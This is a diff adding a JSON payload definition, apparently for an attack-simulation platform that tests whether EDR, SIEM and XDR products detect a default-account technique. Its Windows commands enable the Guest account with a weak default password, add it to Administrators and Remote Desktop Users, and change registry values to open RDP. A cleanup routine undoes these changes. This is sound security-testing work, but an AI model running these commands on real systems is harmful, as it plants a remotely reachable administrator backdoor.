@@ -1,0 +1,66 @@
+{
+  "command_content": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup #{local_admin_group} #{guest_user} /add\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f",
+  "command_executor": "cmd",
+  "payload_arguments": [
+    {
+      "default_value": "guest",
+      "key": "guest_user",
+      "type": "text"
+    },
+    {
+      "default_value": "Password123!",
+      "key": "guest_password",
+      "type": "text"
+    },
+    {
+      "default_value": "Administrators",
+      "key": "local_admin_group",
+      "type": "text"
+    },
+    {
+      "default_value": "Remote Desktop Users",
+      "key": "remote_desktop_users_group_name",
+      "type": "text"
+    },
+    {
+      "default_value": "0",
+      "key": "remove_rdp_access_during_cleanup",
+      "type": "text"
+    }
+  ],
+  "payload_attack_patterns": [
+    "T1078.001"
+  ],
+  "payload_cleanup_command": "net user #{guest_user} /active:no >nul 2>&1\nnet localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /delete >nul 2>&1\nif #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f >nul 2>&1)",
+  "payload_cleanup_executor": "cmd",
+  "payload_description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
+  "payload_domains": [
+    {
+      "domain_color": "#389CFF",
+      "domain_name": "Endpoint"
+    }
+  ],
+  "payload_elevation_required": true,
+  "payload_execution_arch": "ALL_ARCHITECTURES",
+  "payload_expectations": [
+    "DETECTION",
+    "PREVENTION"
+  ],
+  "payload_expected_security_platforms": {
+    "DETECTION": [
+      "EDR",
+      "SIEM",
+      "XDR"
+    ],
+    "PREVENTION": [
+      "EDR",
+      "XDR"
+    ]
+  },
+  "payload_external_id": "f2c12fda-3ea2-4b5e-a0a3-cc5900784d3b",
+  "payload_name": "Enable Guest account with RDP capability and admin privileges",
+  "payload_platforms": [
+    "Windows"
+  ],
+  "payload_type": "Command"
+}
